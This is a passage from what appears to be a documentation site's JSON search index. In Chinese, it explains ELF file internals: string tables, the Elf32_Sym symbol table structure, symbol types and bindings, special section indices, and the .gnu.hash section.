\u4e00\u822c\u901a\u8fc7\u5bf9\u5b57\u7b26\u4e32\u7684\u9996\u4e2a\u5b57\u6bcd\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u7684\u4e0b\u6807\u6765\u7d22\u5f15\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32\u8868\u7684\u9996\u5c3e\u5b57\u8282\u90fd\u662fNULL\u3002\u6b64\u5916\uff0c\u7d22\u5f15\u4e3a0\u7684\u5b57\u7b26\u4e32\u8981\u4e48\u6ca1\u6709\u540d\u5b57\uff0c\u8981\u4e48\u5c31\u662f\u540d\u5b57\u4e3a\u7a7a\uff0c\u5176\u89e3\u91ca\u4f9d\u8d56\u4e8e\u4e0a\u4e0b\u6587\u3002\u5b57\u7b26\u4e32\u8868\u4e5f\u53ef\u4ee5\u4e3a\u7a7a\uff0c\u76f8\u5e94\u7684\uff0c\u5176\u8282\u533a\u5934\u90e8\u7684 sh_size \u6210\u5458\u5c06\u4e3a0\u3002\u5728\u7a7a\u5b57\u7b26\u4e32\u8868\u4e2d\u7d22\u5f15\u5927\u4e8e 0 \u7684\u4e0b\u6807\u663e\u7136\u662f\u975e\u6cd5\u7684\u3002 \u4e00\u4e2a\u8282\u533a\u5934\u90e8\u7684 sh_name \u6210\u5458\u7684\u503c\u4e3a\u5176\u76f8\u5e94\u7684\u8282\u533a\u5934\u90e8\u5b57\u7b26\u4e32\u8868\u8282\u533a\u7684\u7d22\u5f15\uff0c\u6b64\u8282\u533a\u7531 ELF \u5934\u7684 e_shstrndx \u6210\u5458\u7ed9\u51fa\u3002\u4e0b\u56fe\u7ed9\u51fa\u4e86\u4e00\u4e2a\u5305\u542b 25 \u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u4e32\u8868\uff0c\u4ee5\u53ca\u4e0e\u4e0d\u540c\u7d22\u5f15\u76f8\u5173\u7684\u5b57\u7b26\u4e32\u3002 \u7d22\u5f15 +0 +1 +2 +3 +4 +5 +6 +7 +8 +9 0 \\0 n a m e . \\0 V a r 10 i a b l e \\0 a b l e 20 \\0 \\0 x x \\0 \u5176\u4e2d\u5305\u542b\u7684\u5b57\u7b26\u4e32\u6709 \u7d22\u5f15 \u5b57\u7b26\u4e32 0 none 1 name. 7 Variable 11 able 16 able 24 \u7a7a\u5b57\u7b26\u4e32 \u53ef\u4ee5\u770b\u51fa \u5b57\u7b26\u4e32\u8868\u7d22\u5f15\u53ef\u4ee5\u5f15\u7528\u8282\u533a\u4e2d\u4efb\u610f\u5b57\u8282\u3002 \u5b57\u7b26\u4e32\u53ef\u4ee5\u51fa\u73b0\u591a\u6b21\u3002 \u53ef\u4ee5\u5b58\u5728\u5bf9\u5b50\u5b57\u7b26\u4e32\u7684\u5f15\u7528\u3002 \u540c\u4e00\u4e2a\u5b57\u7b26\u4e32\u53ef\u4ee5\u88ab\u5f15\u7528\u591a\u6b21\u3002 \u5b57\u7b26\u4e32\u8868\u4e2d\u4e5f\u53ef\u4ee5\u5b58\u5728\u672a\u5f15\u7528\u7684\u5b57\u7b26\u4e32\u3002 \u8fd9\u90e8\u5206\u4fe1\u606f\u5728\u8fdb\u884c strip \u540e\u5c31\u4f1a\u6d88\u5931\u3002","title":".strtab: String Table"},{"location":"executable/elf/elf_structure/#shstrtab-section-header-string-table","text":"\u8be5\u8282\u533a\u4e0e .strtab \u7684\u5b58\u50a8\u7ed3\u6784\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u8be5\u8282\u533a\u5b58\u50a8\u7684\u662f\u8282\u533a\u540d\u7684\u5b57\u7b26\u4e32\u3002","title":".shstrtab: Section Header String Table"},{"location":"executable/elf/elf_structure/#symtab-symbol-table","text":"","title":".symtab: Symbol Table"},{"location":"executable/elf/elf_structure/#_12","text":"\u6bcf\u4e2a\u76ee\u6807\u6587\u4ef6\u90fd\u4f1a\u6709\u4e00\u4e2a\u7b26\u53f7\u8868\uff0c\u719f\u6089\u7f16\u8bd1\u539f\u7406\u7684\u5c31\u4f1a\u77e5\u9053\uff0c\u5728\u7f16\u8bd1\u7a0b\u5e8f\u65f6\uff0c\u5fc5\u987b\u6709\u76f8\u5e94\u7684\u7ed3\u6784\u6765\u7ba1\u7406\u7a0b\u5e8f\u4e2d\u7684\u7b26\u53f7\u4ee5\u4fbf\u4e8e\u5bf9\u51fd\u6570\u548c\u53d8\u91cf\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002 \u6b64\u5916\uff0c\u94fe\u63a5\u672c\u8d28\u5c31\u662f\u628a\u591a\u4e2a\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u76f8\u4e92\u201c\u7c98\u201d\u5728\u4e00\u8d77\uff0c\u5b9e\u9645\u4e0a\uff0c\u76ee\u6807\u6587\u4ef6\u76f8\u4e92\u7c98\u5408\u662f\u76ee\u6807\u6587\u4ef6\u4e4b\u95f4\u5bf9\u5730\u5740\u7684\u5f15\u7528\uff0c\u5373\u51fd\u6570\u548c\u53d8\u91cf\u7684\u5730\u5740\u7684\u76f8\u4e92\u5f15\u7528\u3002\u800c\u5728\u7c98\u5408\u7684\u8fc7\u7a0b\u4e2d\uff0c\u7b26\u53f7\u5c31\u662f\u5176\u4e2d\u7684\u7c98\u5408\u5242\u3002 \u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\u8868\u5305\u542b\u4e86 \u4e00\u4e9b\u901a\u7528\u7684\u7b26\u53f7 \uff0c\u8fd9\u90e8\u5206\u4fe1\u606f\u5728\u8fdb\u884c\u4e86 strip \u64cd\u4f5c\u540e\u5c31\u4f1a\u6d88\u5931\u3002\u5305\u62ec \u53d8\u91cf\u540d \u51fd\u6570\u540d \u7b26\u53f7\u8868\u5176\u5b9e\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u5177\u4f53\u5982\u4e0b typedef struct { Elf32_Word st_name ; Elf32_Addr st_value ; Elf32_Word st_size ; unsigned char st_info ; unsigned char st_other ; Elf32_Half st_shndx ; } Elf32_Sym ; \u6bcf\u4e2a\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b \u5b57\u6bb5 \u8bf4\u660e st_name \u7b26\u53f7\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u5bf9\u5e94\u7684\u7d22\u5f15\u3002\u5982\u679c\u8be5\u503c\u975e 0\uff0c\u5219\u5b83\u8868\u793a\u4e86\u7ed9\u51fa\u7b26\u53f7\u540d\u7684\u5b57\u7b26\u4e32\u8868\u7d22\u5f15\uff0c\u5426\u5219\u7b26\u53f7\u8868\u9879\u6ca1\u6709\u540d\u79f0\u3002 \u6ce8\uff1a\u5916\u90e8 C \u7b26\u53f7\u5728 C \u8bed\u8a00\u548c\u76ee\u6807\u6587\u4ef6\u7684\u7b26\u53f7\u8868\u4e2d\u5177\u6709\u76f8\u540c\u7684\u540d\u79f0\u3002 st_value \u7ed9\u51fa\u4e0e\u7b26\u53f7\u76f8\u5173\u8054\u7684\u6570\u503c\uff0c\u5177\u4f53\u53d6\u503c\u4f9d\u8d56\u4e8e\u4e0a\u4e0b\u6587\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u6b63\u5e38\u7684\u6570\u503c\u3001\u4e00\u4e2a\u5730\u5740\u7b49\u7b49\u3002 st_size \u7ed9\u51fa\u5bf9\u5e94\u7b26\u53f7\u6240\u5360\u7528\u7684\u5927\u5c0f\u3002\u5982\u679c\u7b26\u53f7\u6ca1\u6709\u5927\u5c0f\u6216\u8005\u5927\u5c0f\u672a\u77e5\uff0c\u5219\u6b64\u6210\u5458\u4e3a0\u3002 st_info \u7ed9\u51fa\u7b26\u53f7\u7684\u7c7b\u578b\u548c\u7ed1\u5b9a\u5c5e\u6027\u3002\u4e4b\u540e\u4f1a\u7ed9\u51fa\u82e5\u5e72\u53d6\u503c\u548c\u542b\u4e49\u7684\u7ed1\u5b9a\u5173\u7cfb\u3002 st_other \u76ee\u524d\u4e3a0\uff0c\u5176\u542b\u4e49\u6ca1\u6709\u88ab\u5b9a\u4e49\u3002 st_shndx \u5982\u679c\u7b26\u53f7\u5b9a\u4e49\u5728\u8be5\u6587\u4ef6\u4e2d\uff0c\u90a3\u4e48\u8be5\u6210\u5458\u4e3a\u7b26\u53f7\u6240\u5728\u8282\u5728\u8282\u533a\u5934\u90e8\u8868\u4e2d\u7684\u4e0b\u6807\uff1b\u5982\u679c\u7b26\u53f7\u4e0d\u5728\u672c\u76ee\u6807\u6587\u4ef6\u4e2d\u56fd\uff0c\u6216\u8005\u5bf9\u4e8e\u67d0\u4e9b\u7279\u6b8a\u7684\u7b26\u53f7\uff0c\u8be5\u6210\u5458\u5177\u6709\u4e00\u4e9b\u7279\u6b8a\u542b\u4e49\u3002 \u5176\u4e2d\uff0c\u7b26\u53f7\u8868\u4e2d\u4e0b\u6807 0 \u5b58\u50a8\u4e86\u7b26\u53f7\u8868\u7684\u4e00\u4e2a\u5143\u7d20\uff0c\u540c\u65f6\u8fd9\u4e2a\u5143\u7d20\u4e5f\u76f8\u5bf9\u6bd4\u8f83\u7279\u6b8a\uff0c\u4f5c\u4e3a\u6240\u6709\u672a\u5b9a\u4e49\u7b26\u53f7\u7684\u7d22\u5f15\uff0c\u5177\u4f53\u5982\u4e0b \u540d\u79f0 \u53d6\u503c \u8bf4\u660e st_name 0 \u65e0\u540d\u79f0 st_value 0 0 \u503c st_size 0 \u65e0\u5927\u5c0f st_info 0 \u65e0\u7c7b\u578b\uff0c\u5c40\u90e8\u7ed1\u5b9a st_other 0 \u65e0\u9644\u52a0\u4fe1\u606f st_shndx 0 \u65e0\u8282\u533a","title":"\u6982\u8ff0"},{"location":"executable/elf/elf_structure/#st_value","text":"\u5728 Linux \u7684 ELF \u6587\u4ef6\u4e2d\uff0c\u5177\u4f53\u8bf4\u660e\u5982\u4e0b \u8be5\u7b26\u53f7\u5bf9\u5e94\u7740\u4e00\u4e2a\u53d8\u91cf\uff0c\u90a3\u4e48\u8868\u660e\u8be5\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u7684\u504f\u79fb\u3002\u6211\u4eec\u53ef\u7531\u8fd9\u4e2a\u503c\u83b7\u53d6\u5176\u6587\u4ef6\u504f\u79fb \u83b7\u53d6\u8be5\u7b26\u53f7\u5bf9\u5e94\u7684 st_shndx \uff0c\u8fdb\u800c\u83b7\u53d6\u5230\u76f8\u5173\u7684\u8282\u533a\u3002 \u6839\u636e\u8282\u533a\u5934\u5143\u7d20\u53ef\u4ee5\u83b7\u53d6\u8282\u533a\u7684\u865a\u62df\u57fa\u5730\u5740\u548c\u6587\u4ef6\u57fa\u5730\u5740\u3002 value-\u5185\u5b58\u57fa\u865a\u62df\u5730\u5740=\u6587\u4ef6\u504f\u79fb-\u6587\u4ef6\u57fa\u5730\u5740 \u8be5\u7b26\u53f7\u5bf9\u5e94\u7740\u4e00\u4e2a\u51fd\u6570\uff0c\u90a3\u4e48\u8868\u660e\u8be5\u51fd\u6570\u5728\u6587\u4ef6\u4e2d\u7684\u8d77\u59cb\u5730\u5740\u3002","title":"st_value"},{"location":"executable/elf/elf_structure/#st_info","text":"st_info \u4e2d\u5305\u542b\u7b26\u53f7\u7c7b\u578b\u548c\u7ed1\u5b9a\u4fe1\u606f\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e86\u63a7\u5236\u5b83\u7684\u503c\u7684\u65b9\u5f0f\u5177\u4f53\u4fe1\u606f\u5982\u4e0b #define ELF32_ST_TYPE(i) ((i)&0xf) #define ELF32_ST_INFO(b, t) (((b)<<4) + ((t)&0xf))","title":"st_info"},{"location":"executable/elf/elf_structure/#symbol-type","text":"\u53ef\u4ee5\u770b\u51fa st_info \u7684\u4f4e 4 \u4f4d\u8868\u793a\u7b26\u53f7\u7684\u7c7b\u578b\uff0c\u5177\u4f53\u5b9a\u4e49\u5982\u4e0b \u540d\u79f0 \u53d6\u503c \u8bf4\u660e STT_NOTYPE 0 \u7b26\u53f7\u7684\u7c7b\u578b\u6ca1\u6709\u5b9a\u4e49\u3002 STT_OBJECT 1 \u7b26\u53f7\u4e0e\u67d0\u4e2a\u6570\u636e\u5bf9\u8c61\u76f8\u5173\uff0c\u6bd4\u5982\u4e00\u4e2a\u53d8\u91cf\u3001\u6570\u7ec4\u7b49\u7b49\u3002 STT_FUNC 2 \u7b26\u53f7\u4e0e\u67d0\u4e2a\u51fd\u6570\u6216\u8005\u5176\u4ed6\u53ef\u6267\u884c\u4ee3\u7801\u76f8\u5173\u3002 STT_SECTION 3 \u7b26\u53f7\u4e0e\u67d0\u4e2a\u8282\u533a\u76f8\u5173\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u7b26\u53f7\u8868\u9879\u4e3b\u8981\u7528\u4e8e\u91cd\u5b9a\u4f4d\uff0c\u901a\u5e38\u5177\u6709 STB_LOCAL \u7ed1\u5b9a\u3002 STT_FILE 4 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7b26\u53f7\u7684\u540d\u79f0\u7ed9\u51fa\u4e86\u751f\u6210\u8be5\u76ee\u6807\u6587\u4ef6\u76f8\u5173\u7684\u6e90\u6587\u4ef6\u7684\u540d\u79f0\u3002\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u8be5\u7b26\u53f7\u5177\u6709 STB_LOCAL \u7ed1\u5b9a\uff0c\u5176\u8282\u533a\u7d22\u5f15\u662f SHN_ABS \u4e14\u4f18\u5148\u7ea7\u6bd4\u5176\u4ed6 STB_LOCAL \u7b26\u53f7\u9ad8\u3002 STT_LOPROC \uff5e STT_HIPROC 13~15 \u4fdd\u7559\u7528\u4e8e\u7279\u5b9a\u5904\u7406\u5668 \u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u7b26\u53f7\u6709\u6bd4\u8f83\u7279\u6b8a\uff0c\u5f53\u53e6\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u4ece\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5f15\u7528\u4e00\u4e2a\u51fd\u6570\u65f6\uff0c\u94fe\u63a5\u5668\u81ea\u52a8\u4e3a\u88ab\u5f15\u7528\u7b26\u53f7\u521b\u5efa\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u3002\u5171\u4eab\u76ee\u6807\u4e2d\u9664\u4e86 STT_FUNC \uff0c \u5176\u5b83\u7b26\u53f7\u5c06\u4e0d\u4f1a\u901a\u8fc7\u8fc7\u7a0b\u94fe\u63a5\u8868\u81ea\u52a8\u88ab\u5f15\u7528\u3002 \u5982\u679c\u4e00\u4e2a\u7b26\u53f7\u7684\u503c\u6307\u5411\u8282\u5185\u7684\u7279\u5b9a\u4f4d\u7f6e\uff0c\u5219\u5b83\u7684\u8282\u7d22\u5f15\u53f7 st_shndx \uff0c\u5305\u542b\u4e86\u5b83\u5728\u8282\u5934\u8868\u4e2d\u7684\u7d22\u5f15\u3002\u5f53\u4e00\u4e2a\u8282\u5728\u91cd\u5b9a\u4f4d\u8fc7\u7a0b\u4e2d\u79fb\u52a8\u65f6\uff0c\u8be5\u7b26\u53f7\u503c\u4e5f\u505a\u76f8\u5e94\u6539\u53d8\uff0c\u5bf9\u8be5\u7b26\u53f7\u7684\u5f15\u7528\u7ee7\u7eed\u6307\u5411\u7a0b\u5e8f\u4e2d\u7684\u76f8\u540c\u4f4d\u7f6e\u3002\u6709\u4e9b\u7279\u5b9a\u8282\u7d22\u5f15\u503c\u5177\u6709\u5176\u4ed6\u8bed\u4e49\u3002","title":"Symbol Type"},{"location":"executable/elf/elf_structure/#symbol-binding","text":"\u6839\u636e #define ELF32_ST_BIND(i) ((i)>>4) \u53ef\u4ee5\u770b\u51fa st_info \u7684\u9ad8 4 \u4f4d\u8868\u793a\u7b26\u53f7\u7ed1\u5b9a\u7684\u4fe1\u606f\u3002\u800c\u8fd9\u90e8\u5206\u4fe1\u606f\u786e\u5b9a\u4e86\u7b26\u53f7\u7684\u94fe\u63a5\u53ef\u89c1\u6027\u4ee5\u53ca\u5176\u884c\u4e3a\uff0c\u5177\u4f53\u7684\u53d6\u503c\u5982\u4e0b \u540d\u79f0 \u53d6\u503c \u8bf4\u660e STB_LOCAL 0 \u8868\u660e\u8be5\u7b26\u53f7\u4e3a\u5c40\u90e8\u7b26\u53f7\uff0c\u5728\u5305\u542b\u8be5\u7b26\u53f7\u5b9a\u4e49\u7684\u76ee\u6807\u6587\u4ef6\u4ee5\u5916\u4e0d\u53ef\u89c1\u3002\u76f8\u540c\u540d\u79f0\u7684\u5c40\u90e8\u7b26\u53f7\u53ef\u4ee5\u5b58\u5728\u4e8e\u591a\u4e2a\u6587\u4ef6\u4e2d\uff0c\u4e92\u4e0d\u5f71\u54cd\u3002 STB_GLOBAL 1 \u8868\u660e\u8be5\u7b26\u53f7\u4e3a\u5168\u5c40\u7b26\u53f7\uff0c\u5bf9\u6240\u6709\u5c06\u88ab\u7ec4\u5408\u5728\u4e00\u8d77\u7684\u76ee\u6807\u6587\u4ef6\u90fd\u662f\u53ef\u89c1\u7684\u3002\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5bf9\u67d0\u4e2a\u5168\u5c40\u7b26\u53f7\u7684\u5b9a\u4e49\u5c06\u6ee1\u8db3\u53e6\u4e00\u4e2a\u6587\u4ef6\u5bf9\u76f8\u540c\u5168\u5c40\u7b26\u53f7\u7684\u672a\u5b9a\u4e49\u5f15\u7528\u3002\u6211\u4eec\u79f0\u521d\u59cb\u5316\u975e\u96f6\u53d8\u91cf\u7684\u5168\u5c40\u7b26\u53f7\u4e3a\u5f3a\u7b26\u53f7\uff0c\u53ea\u80fd\u5b9a\u4e49\u4e00\u6b21\u3002 STB_WEAK 2 \u5f31\u7b26\u53f7\u4e0e\u5168\u5c40\u7b26\u53f7\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u5b83\u4eec\u7684\u5b9a\u4e49\u4f18\u5148\u7ea7\u6bd4\u8f83\u4f4e\u3002 STB_LOPROC ~STB_HIPROC 13 \u8fd9\u4e2a\u8303\u56f4\u7684\u53d6\u503c\u662f\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u3002 \u5728\u6bcf\u4e2a\u7b26\u53f7\u8868\u4e2d\uff0c\u6240\u6709\u5177\u6709 STB_LOCAL \u7ed1\u5b9a\u7684\u7b26\u53f7\u90fd\u4f18\u5148\u4e8e\u5f31\u7b26\u53f7\u548c\u5168\u5c40\u7b26\u53f7\u3002\u7b26\u53f7\u8868\u8282\u533a\u4e2d\u7684 sh_info \u9879\u6240\u5bf9\u5e94\u7684\u5934\u90e8\u7684\u6210\u5458\u5305\u542b\u7b2c\u4e00\u4e2a\u975e\u5c40\u90e8\u7b26\u53f7\u7684\u7b26\u53f7\u8868\u7d22\u5f15\u3002 \u6b64\u5916\uff0c\u5168\u5c40\u7b26\u53f7\u4e0e\u5f31\u7b26\u53f7\u7684\u4e3b\u8981\u533a\u522b\u5982\u4e0b\uff1a \u5f53\u94fe\u63a5\u5668\u5728\u94fe\u63a5\u591a\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u4e0d\u5141\u8bb8\u5b9a\u4e49\u591a\u4e2a\u76f8\u540c\u540d\u5b57\u7684 STB_GLOBAL \u7b26\u53f7\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u5df2\u5b9a\u4e49\u5168\u5c40\u7b26\u53f7\uff0c\u5219\u540c\u540d\u7684\u5f31\u7b26\u53f7\u7684\u5b58\u5728\u4e0d\u4f1a\u5f15\u8d77\u9519\u8bef\u3002\u94fe\u63a5\u5668\u4f1a\u4f18\u5148\u9009\u62e9\u5168\u5c40\u5b9a\u4e49\uff0c\u5ffd\u7565\u5f31\u7b26\u53f7\u5b9a\u4e49\u3002\u7c7b\u4f3c\u7684\uff0c\u5982\u679c\u4e00\u4e2a\u516c\u5171\u7b26\u53f7\u5b58\u5728( st_shndx \u57df\u4e3a SHN_COMMON \u7684\u7b26\u53f7)\uff0c\u5219\u540c\u540d\u7684\u5f31\u7b26\u53f7\u7684\u5b58\u5728\u4e0d\u4f1a\u5f15\u8d77\u9519\u8bef\u3002\u94fe\u63a5\u5668\u4f1a\u9009\u62e9\u516c\u5171\u5b9a\u4e49\uff0c\u5ffd\u7565\u5f31\u7b26\u53f7\u5b9a\u4e49\u3002 \u5f53\u94fe\u63a5\u5668\u5bfb\u627e\u6587\u4ef6\u5e93\u65f6\uff0c\u5b83\u4f1a\u63d0\u53d6\u5305\u542b\u672a\u5b9a\u4e49\u5168\u5c40\u7b26\u53f7\u7684\u6210\u5458\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u5168\u5c40\u7b26\u53f7\u6216\u8005\u5f31\u7b26\u53f7\u3002\u94fe\u63a5\u5668\u4e0d\u4f1a\u4e3a\u4e86\u89e3\u51b3\u672a\u5b9a\u4e49\u7684\u5f31\u7b26\u53f7\u95ee\u9898\u800c\u63d0\u53d6\u6587\u4ef6\uff0c\u672a\u5b9a\u4e49\u7684\u5f31\u7b26\u53f7\u7684\u503c\u4e3a0\u3002","title":"Symbol Binding"},{"location":"executable/elf/elf_structure/#_13","text":"\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u5bf9\u7b26\u53f7\u8868\u9879\u4e2d st_value \u6210\u5458\u7684\u89e3\u91ca\u4e0d\u540c\uff1a \u5728\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e2d\uff0cst_value \u4fdd\u5b58\u4e86\u8282\u533a\u7d22\u5f15\u4e3a SHN_COMMON \u7684\u7b26\u53f7\u7684\u5bf9\u9f50\u7ea6\u675f\u3002 \u5728\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e2d\uff0cst_value \u4fdd\u5b58\u4e86\u5df2\u5b9a\u4e49\u7b26\u53f7\u7684\u8282\u533a\u504f\u79fb\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cst_value\u4fdd\u7559\u4e86st_shndx \u6240\u6807\u8bc6\u7684\u8282\u533a\u7684\u5934\u90e8\u5230\u7b26\u53f7\u4f4d\u7f6e\u7684\u504f\u79fb\u3002 \u5728\u53ef\u6267\u884c\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\uff0cst_value \u5305\u542b\u4e00\u4e2a\u865a\u5730\u5740\u3002\u4e3a\u4e86\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u7b26\u53f7\u5bf9\u52a8\u6001\u94fe\u63a5\u5668\u66f4\u6709\u7528\uff0c\u8282\u533a\u504f\u79fb\uff08\u9488\u5bf9\u6587\u4ef6\u7684\u89e3\u91ca\uff09\u7ed9\u51fa\u4e86\u4e0e\u8282\u533a\u53f7\u65e0\u5173\u7684\u865a\u62df\u5730\u5740\uff08\u9488\u5bf9\u5185\u5b58\u7684\u89e3\u91ca\uff09\u3002 \u7b26\u53f7\u8868\u53d6\u503c\u5728\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u4e2d\u5177\u6709\u76f8\u4f3c\u7684\u542b\u4e49\uff0c\u53ef\u4ee5\u6709\u9002\u5f53\u7684\u7a0b\u5e8f\u53ef\u4ee5\u91c7\u53d6\u9ad8\u6548\u7684\u65b9\u6cd5\u6765\u8bbf\u95ee\u6570\u636e\u3002","title":"\u7b26\u53f7\u53d6\u503c"},{"location":"executable/elf/elf_structure/#st_shndx","text":"\u7279\u6b8a\u7684\u7d22\u5f15\u53ca\u5176\u610f\u4e49\u5982\u4e0b SHN_ABS\uff1a \u7b26\u53f7\u7684\u53d6\u503c\u5177\u6709\u7edd\u5bf9\u6027\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u91cd\u5b9a\u4f4d\u800c\u53d1\u751f\u53d8\u5316\u3002 SHN_COMMON\uff1a \u7b26\u53f7\u6807\u8bb0\u4e86\u4e00\u4e2a\u5c1a\u672a\u5206\u914d\u7684\u516c\u5171\u5757\u3002\u7b26\u53f7\u7684\u53d6\u503c\u7ed9\u51fa\u4e86\u5bf9\u9f50\u7ea6\u675f\uff0c\u4e0e\u8282\u533a\u7684 sh_addralign \u6210\u5458\u7c7b\u4f3c\u3002\u5c31\u662f\u8bf4\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u5728\u5730\u5740\u4f4d\u4e8e st_value \u7684\u500d\u6570\u5904\u4e3a\u7b26\u53f7\u5206\u914d\u7a7a\u95f4\u3002\u7b26\u53f7\u7684\u5927\u5c0f\u7ed9\u51fa\u4e86\u6240\u9700\u8981\u7684\u5b57\u8282\u6570\u3002 SHN_UNDEF\uff1a \u6b64\u7d22\u5f15\u503c\u8868\u793a\u7b26\u53f7\u6ca1\u6709\u5b9a\u4e49\u3002\u5f53\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u6b64\u76ee\u6807\u6587\u4ef6\u4e0e\u5176\u4ed6\u5b9a\u4e49\u4e86\u8be5\u7b26\u53f7\u7684\u76ee\u6807\u6587\u4ef6\u8fdb\u884c\u7ec4\u5408\u65f6\uff0c\u6b64\u6587\u4ef6\u4e2d\u5bf9\u8be5\u7b26\u53f7\u7684\u5f15\u7528\u5c06\u88ab\u94fe\u63a5\u5230\u5b9e\u9645\u5b9a\u4e49\u7684\u4f4d\u7f6e\u3002","title":"st_shndx"},{"location":"executable/elf/elf_structure/#_14","text":"\u90a3\u4e48\u5bf9\u4e8e\u4e00\u4e2a\u7b26\u53f7\u6765\u8bf4\u5982\u4f55\u5b9a\u4f4d\u5176\u5bf9\u5e94\u5b57\u7b26\u4e32\u7684\u5730\u5740\u5462\uff1f\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b \u6839\u636e Section Header Table \u4e2d\u7b26\u53f7\u8282\u5934\u4e2d\u7684 sh_link \u83b7\u53d6\u8be5\u7b26\u53f7\u8282\u4e2d\u5bf9\u5e94\u7b26\u53f7\u5b57\u7b26\u4e32\u8282\u5728 Section Header Table \u4e2d\u7684\u4e0b\u6807\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5bf9\u5e94\u7b26\u53f7\u8282\u7684\u5730\u5740\u3002 \u6839\u636e\u8be5\u7b26\u53f7\u7684\u5b9a\u4e49\u4e2d\u7684 st_name \u83b7\u53d6\u8be5\u7b26\u53f7\u7684\u504f\u79fb\uff0c\u5373\u5728\u5bf9\u5e94\u7b26\u53f7\u8282\u4e2d\u7684\u504f\u79fb\u3002 \u6839\u636e\u4e0a\u8ff0\u4e24\u8005\u5c31\u53ef\u4ee5\u5b9a\u4f4d\u4e00\u4e2a\u7b26\u53f7\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\u4e86\u3002","title":"\u5982\u4f55\u5b9a\u4f4d"},{"location":"executable/elf/elf_structure/#gnuhash","text":"\u6ce8\uff1a\u672c\u90e8\u5206\u4e3b\u8981\u53c2\u8003https://blogs.oracle.com/ali/gnu-hash-elf-sections\u3002 \u5728 ELF \u826f\u597d\u5730\u53ef\u6269\u5c55\u6027\u7684\u5e2e\u52a9\u4e0b\uff0c GNU \u4e3a ELF \u5bf9\u8c61\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u54c8\u5e0c\u8282\uff0c\u8fd9\u4e2a\u8282\u7684\u6027\u80fd\u76f8\u6bd4\u4e8e\u539f\u6709\u7684 SYSV hash \u4f1a\u597d\u5f88\u591a\u3002\u8be5\u8282\u7528\u4e8e\u5feb\u901f\u6839\u636e\u7b26\u53f7\u540d\u83b7\u53d6\u5bf9\u5e94\u7b26\u53f7\u8868\u4e2d\u7684\u7d22\u5f15\u3002 \u66f4\u591a\u5185\u5bb9\u8bf7\u53c2\u8003 https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections \u3002 \u6709\u5f85\u8fdb\u4e00\u6b65\u5b66\u4e60\u3002","title":".gnu.hash"},{"location":"executable/elf/elf_structure/#elf_1","text":"ELF\u6587\u4ef6\u4e2d\u7684\u54c8\u5e0c\u8868\u7531 Elf32_Word \u5bf9\u8c61\u6784\u6210\uff0c\u7528\u6765\u652f\u6301\u7b26\u53f7\u8868\u8bbf\u95ee\u3002\u4e0b\u9762\u7684\u7b26\u53f7\u53ef\u4ee5\u7528\u6765\u8f85\u52a9\u89e3\u91ca\u7b26\u53f7\u8868\u7684\u7ec4\u7ec7\u60c5\u51b5\uff0c\u4f46\u662f\u4ed6\u4eec\u5e76\u4e0d\u662f ELF \u6587\u4ef6\u8bf4\u660e\u7684\u4e00\u90e8\u5206\u3002 